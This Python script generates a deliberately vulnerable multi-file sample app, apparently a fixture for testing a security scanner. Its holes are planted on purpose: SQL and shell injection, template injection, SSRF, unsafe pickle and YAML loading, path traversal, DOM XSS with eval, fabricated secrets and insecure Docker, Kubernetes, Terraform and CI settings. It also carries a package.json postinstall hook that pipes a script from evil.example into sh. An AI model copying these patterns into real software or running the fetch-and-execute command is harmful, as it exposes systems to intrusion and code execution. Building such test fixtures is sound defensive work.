"""Builds a deliberately vulnerable sample application into a directory.

The fixture is generated rather than committed so this repository never
contains literal secret-shaped strings or ready-to-run vulnerable code that
other scanners (or GitHub push protection) would flag. All "secrets" are
fabricated, assembled at runtime, and invalid.

Usage: python3 build_fixture.py <dest-dir>
"""

import json
import os
import sys

# Assembled so the source file itself contains no secret-shaped literal.
FAKE_AWS_KEY = "AKIA" + "Q3VJ7ZK2" + "WXNB5PLM"
FAKE_GH_TOKEN = "ghp_" + "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6"
FAKE_DB_PW = "Pr0d" + "Db-9xq!"

FILES = {
    "app.py": f'''\
import os
import pickle
import sqlite3
import subprocess

import requests
import yaml
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)
app.config["SECRET_KEY"] = "s3cr3t-flask-k3y-do-not-ship"
AWS_ACCESS_KEY_ID = "{FAKE_AWS_KEY}"


@app.route("/user")
def user():
    uid = request.args.get("id")
    conn = sqlite3.connect("app.db")
    return str(conn.execute(f"SELECT * FROM users WHERE id = {{uid}}").fetchall())


@app.route("/ping")
def ping():
    host = request.args.get("host")
    return subprocess.check_output("ping -c 1 " + host, shell=True)


@app.route("/hello")
def hello():
    return render_template_string("<h1>Hello " + request.args.get("name", "") + "</h1>")


@app.route("/fetch")
def fetch():
    return requests.get(request.args["url"], timeout=5).text


@app.route("/go")
def go():
    return redirect(request.args.get("next"))


@app.route("/load", methods=["POST"])
def load():
    return str(pickle.loads(request.data))


@app.route("/config", methods=["POST"])
def config():
    return str(yaml.load(request.data))


@app.route("/download")
def download():
    return open(os.path.join("files", request.args["name"])).read()


if __name__ == "__main__":
    requests.get("https://internal.example", verify=False)
    app.run(host="0.0.0.0", debug=True)
''',
    "requirements.txt": "flask\nrequests>=2.0\npyyaml==5.3\nreqeusts==2.31.0\n--extra-index-url https://pypi.internal.example/simple\n",
    "server.js": '''\
const express = require("express");
const { exec } = require("child_process");
const jwt = require("jsonwebtoken");
const app = express();
app.use(require("cors")());

app.get("/search", (req, res) => {
  db.query(`SELECT * FROM items WHERE name = '${req.query.q}'`, (e, rows) => res.json(rows));
});

app.get("/convert", (req, res) => {
  exec(`convert ${req.query.file} out.png`, () => res.send("ok"));
});

app.get("/profile", (req, res) => {
  res.send(`<p>Welcome ${req.query.name}</p>`);
});

app.post("/users", async (req, res) => {
  const user = await User.create(req.body);
  res.json(user);
});

app.get("/me", (req, res) => {
  const claims = jwt.decode(req.headers.authorization);
  const token = jwt.sign({ id: 1 }, "hardcoded-jwt-secret-value");
  res.json({ claims, token, sid: Math.random().toString(36) });
});

app.get("/file", (req, res) => res.sendFile(req.query.path));
app.listen(3000);
''',
    "package.json": json.dumps({
        "name": "vulnerable-fixture",
        "version": "1.0.0",
        "scripts": {"postinstall": "curl -s https://evil.example/install.sh | sh", "start": "node server.js"},
        "dependencies": {"express": "4.17.1", "jsonwebtoken": "*", "cors": "^2.8.5", "lodahs": "^4.17.21",
                         "left-pad": "git+https://github.com/example/left-pad.git"},
    }, indent=2) + "\n",
    "public/app.js": '''\
const params = new URLSearchParams(location.search);
document.getElementById("out").innerHTML = params.get("msg");
eval(atob(params.get("payload")));
''',
    ".env": f"DATABASE_URL=postgres://admin:{FAKE_DB_PW}@db.internal:5432/app\nGITHUB_TOKEN={FAKE_GH_TOKEN}\n",
    "Dockerfile": "FROM python:latest\nADD https://example.com/tool.tar.gz /opt/\nENV DB_PASSWORD=supersecret123\nCOPY . /app\nRUN curl -fsSL https://get.example.sh | bash\nCMD [\"python\", \"/app/app.py\"]\n",
    "k8s/deployment.yaml": '''\
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: web
          image: example/web:latest
          securityContext:
            privileged: true
            allowPrivilegeEscalation: true
''',
    "infra/main.tf": '''\
provider "aws" { region = "us-east-1" }

resource "aws_security_group" "web" {
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_s3_bucket_public_access_block" "b" {
  bucket              = "data"
  block_public_acls   = false
  block_public_policy = false
}

resource "aws_db_instance" "db" {
  publicly_accessible = true
  storage_encrypted   = false
  password            = "hunter2hunter2"
}

resource "aws_instance" "app" {
  metadata_options { http_tokens = "optional" }
}
''',
    ".github/workflows/ci.yml": '''\
name: ci
on:
  pull_request_target:
  issues:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some-org/deploy-action@v2
      - run: echo "Issue: ${{ github.event.issue.title }}"
''',
    "safe.py": '''\
"""Code that should NOT produce injection findings (false-positive guard)."""
import sqlite3
import subprocess
import yaml


def get_user(conn: sqlite3.Connection, uid: int):
    return conn.execute("SELECT * FROM users WHERE id = ?", (uid,)).fetchall()


def run_ls(path: str):
    return subprocess.run(["ls", "-l", path], check=True, capture_output=True)


def parse(data: str):
    return yaml.safe_load(data)
''',
}


def build(dest: str) -> str:
    for rel, content in FILES.items():
        path = os.path.join(dest, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    return dest


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    print(build(sys.argv[1]))
